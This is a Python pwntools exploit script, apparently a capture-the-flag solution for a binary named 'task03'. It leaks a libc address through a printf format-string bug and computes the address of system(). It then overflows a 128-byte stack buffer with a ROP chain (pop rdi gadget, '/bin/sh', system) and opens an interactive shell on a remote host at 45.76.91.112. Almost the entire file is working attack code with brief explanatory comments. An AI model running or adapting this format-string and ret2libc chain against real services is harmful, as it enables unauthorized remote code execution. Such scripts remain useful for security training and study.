from pwn import *


# The first arguments of printf() are passed in registers, but after that they are passed on the stack
# so printf() could search up on the stack as much as we want, even up to the stack of the first main() function.
# Use this function to figure out how far up we need to look.
def tryPrintfArguments():
    for argument_index in range(1, 30):
        io = process("./task03")
        io.recvuntil(b"What is your name?\n")

        format_string = f"%{argument_index}$#llx"

        io.sendline(format_string)
        out = io.recvallS()
        print(f"{format_string} -> {out}")


# tryPrintfArguments(); exit(0)


def solve():
    # io = process("./task03")
    io = remote('45.76.91.112', 10063)

    io.recvuntil(b"What is your name?\n")


    #################### Figure out the address of puts() and then system() ####################

    # NOPE
    # bytes_to_jump = 128 + 8 + 8 + (32 - 8)   # buffer on stack of main2() + RBP + RET + partial stack of main()
    # argument_index = int(bytes_to_jump / 8) - 6   # printf() seems to reserve 8 bytes for each argument and the first 6 arguments are passed as registers

    # from tryPrintfArguments()
    argument_index = 27
    format_string = f"%{argument_index}$#llx\x00".encode('utf-8')

    junk_length = 0
    junk_length += 128 # length of buffer on the stack
    junk_length += 8 # RBP
    junk_length -= len(format_string)
    junk = b'a' * junk_length

    first_ret_value = p64(0x4011B8) # Address of main2()
    input = format_string + junk + first_ret_value
    io.sendline(input)

    hello_puts_addr_line = io.recvline()
    puts_address = int(hello_puts_addr_line.split()[2], 16)
    print(f"{hex(puts_address) = }")

    puts_offset = 0x6f690 # From gdb
    system_offset = 0x45390 # From gdb
    base_libc = puts_address - puts_offset
    system_address = base_libc + system_offset
    print(f"{hex(system_address) = }")

    #################### Figure out the address of puts() and then system() ####################


    # Perform hack
    junk_length = 128 + 8
    msg = b"Hack-in-progress\0"
    junk = b'a' * (junk_length - len(msg))

    first_ret_value = p64(0x4012eb) # Address of "pop rdi; ret" gadget
    rdi_value = p64(0x40302a) # Address of "/bin/sh" in binary
    second_ret_value = p64(system_address)

    input = msg + junk + first_ret_value + rdi_value + second_ret_value
    io.sendline(input)
    io.interactive()

solve()
